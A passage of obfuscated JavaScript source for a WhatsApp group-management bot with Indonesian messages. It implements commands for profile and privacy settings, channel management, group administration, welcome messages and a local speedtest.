          await _0x59f5fa.query({
            'tag': 'iq',
            'attrs': {
              'to': _0xb3f81d,
              'type': "set",
              'xmlns': 'w:profile:picture'
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': 'image'
              },
              'content': _0x5bff0e
            }]
          });
          _0x3a091f(mess.done);
        }
        break;
      case "deleteppbot":
      case "delppbot":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          await _0x59f5fa.removeProfilePicture(_0x59f5fa.user.id);
          _0x3a091f(mess.done);
        }
        break;
      case "setbiobot":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Where is the text?\nExample: " + (_0x4773c6 + _0x4ac520) + " KoKoRey AI");
          }
          await _0x59f5fa.updateProfileStatus(_0x2b2627);
          _0x3a091f(mess.done);
        }
        break;
      case "setdesc":
      case "setdesk":
        if (!_0x3f87c6.isGroup) {
          return _0x3a091f(mess.group);
        }
        if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
          return _0x3a091f(mess.admin);
        }
        if (!_0x26a295) {
          return _0x3a091f(mess.botAdmin);
        }
        if (!_0x2b2627) {
          return _0x3a091f("Text ?");
        }
        await _0x59f5fa.groupUpdateDescription(_0x3f87c6.chat, _0x2b2627);
        _0x3a091f(mess.done);
        break;
      case "cleardesc":
      case "cleardesk":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Perintah ini hanya dapat digunakan dalam grup.");
          }
          if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
            return _0x3a091f("Perintah ini hanya dapat digunakan oleh admin.");
          }
          try {
            await _0x59f5fa.groupUpdateDescription(_0x3f87c6.chat, null);
            _0x3a091f("Deskripsi grup berhasil dihapus.");
          } catch (_0x471550) {
            console.error(_0x471550);
            _0x3a091f("Gagal menghapus deskripsi grup.");
          }
        }
        break;
      case "setcallprivacy":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetcallprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x48d07d = _0x2b2627.toLowerCase();
          if (!['none', 'contacts', 'everyone', 'mycontacts', "mycontactsexcept"].includes(_0x48d07d)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateCallPrivacy(_0x48d07d);
            _0x3a091f("Berhasil mengatur privasi panggilan menjadi \"" + _0x48d07d + "\".");
          } catch (_0x4ce79a) {
            console.error(_0x4ce79a);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi panggilan.");
          }
        }
        break;
      case "setlastprivacy":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetlastprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x220cb0 = _0x2b2627.toLowerCase();
          if (!["none", "contacts", "everyone", "mycontacts", 'mycontactsexcept'].includes(_0x220cb0)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateLastSeenPrivacy(_0x220cb0);
            _0x3a091f("Berhasil mengatur privasi last seen menjadi \"" + _0x220cb0 + "\".");
          } catch (_0x434f7d) {
            console.error(_0x434f7d);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi last seen.");
          }
        }
        break;
      case 'setonlineprivacy':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetonlineprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x115c69 = _0x2b2627.toLowerCase();
          if (!["none", "contacts", 'everyone', "mycontacts", "mycontactsexcept"].includes(_0x115c69)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateOnlinePrivacy(_0x115c69);
            _0x3a091f("Berhasil mengatur privasi online menjadi \"" + _0x115c69 + "\".");
          } catch (_0x85dbce) {
            console.error(_0x85dbce);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi online.");
          }
        }
        break;
      case 'setprofileprivacy':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetprofileprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x361a43 = _0x2b2627.toLowerCase();
          if (!['none', "contacts", "everyone", "mycontacts", "mycontactsexcept"].includes(_0x361a43)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateProfilePicturePrivacy(_0x361a43);
            _0x3a091f("Berhasil mengatur privasi foto profil menjadi \"" + _0x361a43 + "\".");
          } catch (_0x3494d6) {
            console.error(_0x3494d6);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi foto profil.");
          }
        }
        break;
      case "setstatusprivacy":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetstatusprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x41f802 = _0x2b2627.toLowerCase();
          if (!["none", "contacts", "everyone", 'mycontacts', 'mycontactsexcept'].includes(_0x41f802)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateStatusPrivacy(_0x41f802);
            _0x3a091f("Berhasil mengatur privasi status menjadi \"" + _0x41f802 + "\".");
          } catch (_0x4679f0) {
            console.error(_0x4679f0);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi status.");
          }
        }
        break;
      case 'setreadreceiptsprivacy':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan:\nsetreadreceiptsprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept");
          }
          const _0x7265c = _0x2b2627.toLowerCase();
          if (!["none", "contacts", "everyone", "mycontacts", "mycontactsexcept"].includes(_0x7265c)) {
            return _0x3a091f("Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.");
          }
          try {
            await _0x59f5fa.updateReadReceiptsPrivacy(_0x7265c);
            _0x3a091f("Berhasil mengatur privasi read receipts menjadi \"" + _0x7265c + "\".");
          } catch (_0x22854b) {
            console.error(_0x22854b);
            _0x3a091f("Terjadi kesalahan saat mengatur privasi read receipts.");
          }
        }
        break;
      case "setreactionmode":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan: setreactionmode <mode>\n\nContoh:\nsetreactionmode enabled\ntsetreactionmode disabled");
          }
          const _0x45806e = _0x2b2627.toLowerCase();
          if (!["enabled", "disabled"].includes(_0x45806e)) {
            return _0x3a091f("Mode tidak valid. Pilih \"enabled\" atau \"disabled\".");
          }
          try {
            await _0x59f5fa.newsletterReactionMode(saluran, _0x45806e);
            _0x3a091f("Berhasil mengatur mode reaksi menjadi \"" + _0x45806e + "\".");
          } catch (_0x1f062a) {
            console.error(_0x1f062a);
            _0x3a091f("Terjadi kesalahan saat mengatur mode reaksi.");
          }
        }
        break;
      case "setnewsletterdesc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458.join(" ")) {
            return _0x3a091f("Penggunaan: setnewsletterdesc <deskripsi>\n\nContoh:\nsetnewsletterdesc Ini deskripsi baru.");
          }
          const _0x25221a = _0x143458.join(" ");
          try {
            await _0x59f5fa.newsletterUpdateDescription(saluran, _0x25221a);
            _0x3a091f("Berhasil mengubah deskripsi newsletter.");
          } catch (_0x1a380b) {
            console.error(_0x1a380b);
            _0x3a091f("Terjadi kesalahan saat mengubah deskripsi.");
          }
        }
        break;
      case "setnewslettername":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458.join(" ")) {
            return _0x3a091f("Penggunaan: setnewslettername <nama>\n\nContoh:\nsetnewslettername Nama Baru Newsletter.");
          }
          const _0x4973bd = _0x143458.join(" ");
          try {
            await _0x59f5fa.newsletterUpdateName(saluran, _0x4973bd);
            _0x3a091f("Berhasil mengubah nama newsletter.");
          } catch (_0x478ef6) {
            console.error(_0x478ef6);
            _0x3a091f("Terjadi kesalahan saat mengubah nama.");
          }
        }
        break;
      case "setnewsletterpic":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Balas sebuah gambar untuk dijadikan foto profil newsletter.");
          }
          if (!_0x3df746) {
            return _0x3a091f("Balas sebuah gambar untuk dijadikan foto profil newsletter.");
          }
          try {
            const _0x1dfa16 = await _0x3f87c6.quoted.download();
            await _0x59f5fa.newsletterUpdatePicture(saluran, _0x1dfa16);
            _0x3a091f("Berhasil mengubah foto profil newsletter.");
          } catch (_0xf99524) {
            console.error(_0xf99524);
            _0x3a091f("Terjadi kesalahan saat mengubah foto profil.");
          }
        }
        break;
      case 'removenewsletterpic':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          try {
            await _0x59f5fa.newsletterRemovePicture(saluran);
            _0x3a091f("Berhasil menghapus foto profil newsletter.");
          } catch (_0x2964ca) {
            console.error(_0x2964ca);
            _0x3a091f("Terjadi kesalahan saat menghapus foto profil.");
          }
        }
        break;
      case "follownewsletter":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " <link>");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("whatsapp.com/channel")) {
            return _0x3a091f(mess.error);
          }
          try {
            let _0x3d132f = _0x143458[0x0].split("https://whatsapp.com/channel/")[0x1];
            let _0x398401 = await _0x59f5fa.newsletterMetadata("invite", _0x3d132f);
            await _0x59f5fa.newsletterFollow(_0x398401.id);
            _0x3a091f("Berhasil mengikuti newsletter.");
          } catch (_0x4f2712) {
            console.error(_0x4f2712);
            _0x3a091f("Terjadi kesalahan saat mengikuti newsletter.");
          }
        }
        break;
      case "unfollownewsletter":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " <link>");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("whatsapp.com/channel")) {
            return _0x3a091f(mess.error);
          }
          try {
            let _0x58452d = _0x143458[0x0].split("https://whatsapp.com/channel/")[0x1];
            let _0x46699b = await _0x59f5fa.newsletterMetadata('invite', _0x58452d);
            await _0x59f5fa.newsletterUnfollow(_0x46699b.id);
            _0x3a091f("Berhasil berhenti mengikuti newsletter.");
          } catch (_0x3ca9ca) {
            console.error(_0x3ca9ca);
            _0x3a091f("Terjadi kesalahan saat berhenti mengikuti newsletter.");
          }
        }
        break;
      case "mutenewsletter":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " <link>");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes('whatsapp.com/channel')) {
            return _0x3a091f(mess.error);
          }
          try {
            let _0x1f2dd6 = _0x143458[0x0].split("https://whatsapp.com/channel/")[0x1];
            let _0x6f48b7 = await _0x59f5fa.newsletterMetadata('invite', _0x1f2dd6);
            await _0x59f5fa.newsletterMute(_0x6f48b7.id);
            _0x3a091f("Berhasil mematikan pemberitahuan dari newsletter.");
          } catch (_0x573e77) {
            console.error(_0x573e77);
            _0x3a091f("Terjadi kesalahan saat mematikan pemberitahuan.");
          }
        }
        break;
      case "unmutenewsletter":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " <link>");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("whatsapp.com/channel")) {
            return _0x3a091f(mess.error);
          }
          try {
            let _0x3bd8f2 = _0x143458[0x0].split("https://whatsapp.com/channel/")[0x1];
            let _0x4f151f = await _0x59f5fa.newsletterMetadata("invite", _0x3bd8f2);
            await _0x59f5fa.newsletterUnmute(_0x4f151f.id);
            _0x3a091f("Berhasil menghidupkan pemberitahuan dari newsletter.");
          } catch (_0x31c052) {
            console.error(_0x31c052);
            _0x3a091f("Terjadi kesalahan saat menghidupkan pemberitahuan.");
          }
        }
        break;
      case "createnewsletter":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458[0x0] || !_0x143458[0x1]) {
            return _0x3a091f("Penggunaan: createnewsletter <nama> | <deskripsi>\n\nContoh:\ncreatenewsletter Newsletter Baru | Ini deskripsi newsletter.");
          }
          const [_0x5d444b, _0x51b6d9] = _0x143458.join(" ").split('|').map(_0x516873 => _0x516873.trim());
          if (!_0x5d444b || !_0x51b6d9) {
            return _0x3a091f("Format salah. Gunakan \"|\" untuk memisahkan nama dan deskripsi.");
          }
          try {
            const _0x3df3a8 = await _0x59f5fa.newsletterCreate(_0x5d444b, _0x51b6d9);
            _0x3a091f("Newsletter berhasil dibuat.\n\nNama: " + _0x3df3a8.name + "\nDeskripsi: " + _0x3df3a8.description);
          } catch (_0x554ba5) {
            console.error(_0x554ba5);
            _0x3a091f("Terjadi kesalahan saat membuat newsletter.");
          }
        }
        break;
      case "newsletterinfo":
      case 'getnewsletterinfo':
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kirim perintah " + (_0x4773c6 + _0x4ac520) + " <link>");
          }
          if (!isUrl(_0x143458[0x0]) && !_0x143458[0x0].includes("whatsapp.com/channel")) {
            return _0x3a091f(mess.error);
          }
          function _0x5ba7c9(_0x2d56d3) {
            const _0x24e9a0 = new Date(_0x2d56d3 * 0x3e8);
            const _0x17004f = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", 'Oct', "Nov", "Dec"];
            const _0x52d7b8 = _0x24e9a0.getDate();
            const _0x30e4a1 = _0x17004f[_0x24e9a0.getMonth()];
            const _0x2243cd = _0x24e9a0.getFullYear();
            return _0x52d7b8 + " " + _0x30e4a1 + " " + _0x2243cd;
          }
          try {
            let _0x39069c = _0x143458[0x0].split("https://whatsapp.com/channel/")[0x1];
            let _0x3f0510 = await _0x59f5fa.newsletterMetadata("invite", _0x39069c);
            let _0x572f99 = "「 *NEWSLETTER METADATA* 」\n\n";
            _0x572f99 += "- *Name*: " + _0x3f0510.name + "\n";
            _0x572f99 += "- *ID*: " + _0x3f0510.id + "\n";
            _0x572f99 += "- *Status*: " + _0x3f0510.state + "\n";
            _0x572f99 += "- *Dibuat Pada*: " + _0x5ba7c9(_0x3f0510.creation_time) + "\n";
            _0x572f99 += "- *Subscribers*: " + _0x3f0510.subscribers + "\n";
            _0x572f99 += "- *Meta Verify*: " + _0x3f0510.verification + "\n";
            _0x572f99 += "- *React Emoji*: " + _0x3f0510.reaction_codes + "\n";
            _0x572f99 += "- *Description*:\n" + _0x3f0510.description + "\n";
            let _0x11b583 = [{
              'name': "cta_copy",
              'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"display_text\": \"Copy Newsletter ID\",\n\t\t\t\t\t\t\t\"id\": \"" + _0x3f0510.id + "\",\n\t\t\t\t\t\t\t\"copy_code\": \"" + _0x3f0510.id + "\"\n\t\t\t\t\t\t}"
            }];
            _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x11b583, _0x572f99, footer, _0x3f87c6);
          } catch (_0x3745b2) {
            _0x3a091f("*Data tidak ditemukan!* ☹️");
          }
        }
        break;
      case "listpc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x5c345f = await _0x596949.chats.all().filter(_0x4b98a3 => _0x4b98a3.id.endsWith(".net")).map(_0x5f28a8 => _0x5f28a8.id);
          let _0x37ff53 = "⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : " + _0x5c345f.length + " Chat\n\n";
          for (let _0x1e20f0 of _0x5c345f) {
            let _0x3a5b91 = _0x596949.messages[_0x1e20f0].array[0x0].pushName;
            _0x37ff53 += "*Name*: " + _0x3a5b91 + "\n";
            _0x37ff53 += "*User*: @" + _0x1e20f0.split('@')[0x0] + "\n";
            _0x37ff53 += "*Chat*: https://wa.me/" + _0x1e20f0.split('@')[0x0] + "\n\n";
            _0x37ff53 += "━━━━━━━━━━━━━━━━━━━━━\n\n";
          }
          _0x3a091f(_0x37ff53);
        }
        break;
      case "listgc":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x551340 = await _0x596949.chats.all().filter(_0x26031f => _0x26031f.id.endsWith("@g.us")).map(_0x276c6f => _0x276c6f.id);
          let _0xec03e9 = "⬣ *LIST GROUP CHAT*\n\nTotal Group : " + _0x551340.length + " Group\n\n";
          for (let _0x4d34e5 of _0x551340) {
            let _0x2405f6 = await _0x59f5fa.groupMetadata(_0x4d34e5);
            _0xec03e9 += "*Name*: " + _0x2405f6.subject + "\n";
            _0xec03e9 += "*Admin*: " + (_0x2405f6.owner ? '@' + _0x2405f6.owner.split('@')[0x0] : '-') + "\n";
            _0xec03e9 += "*ID*: " + _0x2405f6.id + "\n";
            _0xec03e9 += "*Made*: " + moment(_0x2405f6.creation * 0x3e8).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss") + "\n";
            _0xec03e9 += "*Member*: " + _0x2405f6.participants.length + "\n\n";
            _0xec03e9 += "━━━━━━━━━━━━━━━━━━━━━\n\n";
          }
          _0x3a091f(_0xec03e9);
        }
        break;
      case "listonline":
      case "liston":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          let _0x26371b = _0x143458 && /\d+\-\d+@g.us/.test(_0x143458[0x0]) ? _0x143458[0x0] : _0x3f87c6.chat;
          let _0x57e298 = [...Object.keys(_0x596949.presences[_0x26371b]), _0xb3f81d];
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "List Online:\n\n" + _0x57e298.map(_0x28cb79 => '@' + _0x28cb79.replace(/@.+/, '')).join`\n`,
            'mentions': _0x57e298
          }, {
            'quoted': _0x3f87c6
          })["catch"](_0xbe875e => _0x3a091f("*Data tidak ditemukan! ☹️*"));
        }
        break;
      case "creategroup":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Penggunaan: creategroup <nama grup> | <nomor anggota dipisahkan koma>\n*Kirim perintah*: creategroup Grup Baru | 6281234567890,6289876543210");
          }
          const [_0x39778b, _0x3b34b3] = _0x2b2627.split('|').map(_0x57e23e => _0x57e23e.trim());
          if (!_0x39778b || !_0x3b34b3) {
            return _0x3a091f("Format salah!");
          }
          const _0x252b8f = _0x3b34b3.split(',').map(_0x37f287 => _0x37f287 + "@s.whatsapp.net");
          try {
            const _0x33ed4c = await _0x59f5fa.groupCreate(_0x39778b, _0x252b8f);
            _0x3a091f("*Grup berhasil dibuat*:\n- *Nama*: " + _0x33ed4c.subject + "\n- *ID*: " + _0x33ed4c.id);
          } catch (_0x531584) {
            console.error(_0x531584);
            _0x3a091f("Gagal membuat grup.");
          }
        }
        break;
      case "group":
      case 'grup':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (_0x143458[0x0] === "close") {
            await _0x59f5fa.groupSettingUpdate(_0x3f87c6.chat, "announcement").then(() => _0x3a091f("✅ Grup berhasil ditutup, hanya admin yang bisa mengirim pesan sekarang! 🔒"))["catch"](_0x1fc284 => _0x3a091f("⚠️ Gagal menutup grup: " + _0x1fc284));
          } else if (_0x143458[0x0] === "open") {
            await _0x59f5fa.groupSettingUpdate(_0x3f87c6.chat, 'not_announcement').then(() => _0x3a091f("✅ Grup berhasil dibuka, semua anggota bisa mengirim pesan sekarang! 🔓"))['catch'](_0xb1105f => _0x3a091f("⚠️ Gagal membuka grup: " + _0xb1105f));
          } else {
            _0x3a091f("⚙️ Penggunaan perintah:\n · *" + (_0x4773c6 + _0x4ac520) + " open* → Buka grup\n · *" + (_0x4773c6 + _0x4ac520) + " close* → Tutup grup");
          }
        }
        break;
      case "getpp":
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3f87c6.mentionedJid[0x0] && !_0x3f87c6.quoted && !_0x2b2627) {
            return _0x3a091f("Silahkan tag orangnya ya, kak!");
          }
          let _0x21bfda = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          try {
            avatar = await _0x59f5fa.profilePictureUrl(_0x21bfda, "image");
          } catch {
            avatar = "https://8030.us.kg/file/P2LpaOHxWlJt.jpg";
          }
          try {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': avatar
              },
              'caption': mess.done
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x4de3fe) {
            console.log(_0x4de3fe);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "getppgc":
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          try {
            avatar = await _0x59f5fa.profilePictureUrl(_0x3f87c6.chat, "image");
          } catch {
            avatar = 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg';
          }
          try {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': avatar
              },
              'caption': mess.done
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x1279a6) {
            console.log(_0x1279a6);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "getname":
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3f87c6.mentionedJid[0x0] && !_0x3f87c6.quoted && !_0x2b2627) {
            return _0x3a091f("Silahkan tag orangnya ya, kak!");
          }
          let _0x498bdc = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          try {
            let _0x3b1422 = _0x59f5fa.getName(_0x498bdc);
            _0x3a091f(_0x3b1422);
          } catch (_0x332e00) {
            console.log(_0x332e00);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "getnamegc":
      case "getsubject":
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          try {
            _0x3a091f(_0xcea8c4);
          } catch (_0x5a017c) {
            console.log(_0x5a017c);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        ;
        break;
      case "getdesk":
      case "metadatadesc":
      case 'getdesc':
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          try {
            _0x3a091f(_0x1be075.desc);
          } catch (_0x339d3d) {
            console.log(_0x339d3d);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        ;
        break;
      case "editinfo":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (_0x143458[0x0] === "open") {
            await _0x59f5fa.groupSettingUpdate(_0x3f87c6.chat, "unlocked").then(() => _0x3a091f("✅ Anggota sekarang bisa mengedit info grup! 📛✨"))["catch"](_0x5d153a => _0x3a091f("⚠️ Gagal membuka izin edit info grup: " + _0x5d153a));
          } else if (_0x143458[0x0] === "close") {
            await _0x59f5fa.groupSettingUpdate(_0x3f87c6.chat, "locked").then(() => _0x3a091f("✅ Hanya admin yang bisa mengedit info grup sekarang! 🔒🛡️"))['catch'](_0x5aecee => _0x3a091f("⚠️ Gagal menutup izin edit info grup: " + _0x5aecee));
          } else {
            _0x3a091f("⚙️ Penggunaan perintah:\n · *" + (_0x4773c6 + _0x4ac520) + " open* → Izinkan anggota mengedit info grup\n · *" + (_0x4773c6 + _0x4ac520) + " close* → Hanya admin yang bisa mengedit info grup");
          }
        }
        break;
      case "linkgroup":
      case "linkgrup":
      case "linkgc":
      case "gclink":
      case "grouplink":
      case 'gruplink':
      case "invitecode":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Perintah ini hanya dapat digunakan dalam grup.");
          }
          try {
            const _0x35a5ca = await groupInviteCode(_0x3f87c6.chat);
            _0x3a091f("Kode undangan grup:\nhttps://chat.whatsapp.com/" + _0x35a5ca);
          } catch (_0x54c542) {
            console.error(_0x54c542);
            _0x3a091f("Gagal mendapatkan kode undangan grup.");
          }
        }
        break;
      case "setwelcome":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Cara penggunaan: " + (_0x4773c6 + _0x4ac520) + " *teks_welcome*\n\n_Contoh:_\n" + (_0x4773c6 + _0x4ac520) + " Halo @user, selamat datang di @group!");
          }
          db.data.chats[_0x3f87c6.chat].setwelcome = _0x2b2627;
          _0x3f87c6.reply("Pesan sambutan berhasil diubah ke:\n\n\"" + _0x2b2627 + "\"");
        }
        break;
      case 'delsetwelcome':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!db.data.chats[_0x3f87c6.chat].setwelcome) {
            return _0x3a091f("Pesan sambutan sudah dalam kondisi default sebelumnya.");
          }
          db.data.chats[_0x3f87c6.chat].setwelcome = false;
          _0x3f87c6.reply("Pesan sambutan dikembalikan ke default.");
        }
        break;
      case 'setleft':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Cara penggunaan: " + (_0x4773c6 + _0x4ac520) + " *teks_left*\n\n_Contoh:_\n" + (_0x4773c6 + _0x4ac520) + " Halo @user, selamat tinggal dari @group!");
          }
          db.data.chats[_0x3f87c6.chat].setleft = _0x2b2627;
          _0x3f87c6.reply("Pesan perpisahan berhasil diubah ke:\n\n\"" + _0x2b2627 + "\"");
        }
        break;
      case "delsetleft":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!db.data.chats[_0x3f87c6.chat].setleft) {
            return _0x3a091f("Pesan perpisahan sudah dalam kondisi default sebelumnya.");
          }
          db.data.chats[_0x3f87c6.chat].setleft = false;
          _0x3f87c6.reply("Pesan perpisahan dikembalikan ke default.");
        }
        break;
      case "speedtest":
      case "speed":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x203323 = require("child_process");
          let {
            promisify: _0x22eb48
          } = require('util');
          let _0x5b0781 = _0x22eb48(_0x203323.exec).bind(_0x203323);
          let _0x23b587;
          try {
            _0x23b587 = await _0x5b0781("python3 speed.py");
          } catch (_0x47cd03) {
            _0x23b587 = _0x47cd03;
          } finally {
            let {
              stdout: _0x49ef3e,
              stderr: _0x1e49c8
            } = _0x23b587;
            if (_0x49ef3e.trim()) {
              _0x3a091f(_0x49ef3e);
            }
            if (_0x1e49c8.trim()) {
              _0x3a091f(_0x1e49c8);
            }
          }
        }
        break;
      case "pay":
      case "payment":
        {
          let _0x21b2d7 = [{
            'name': "single_select",
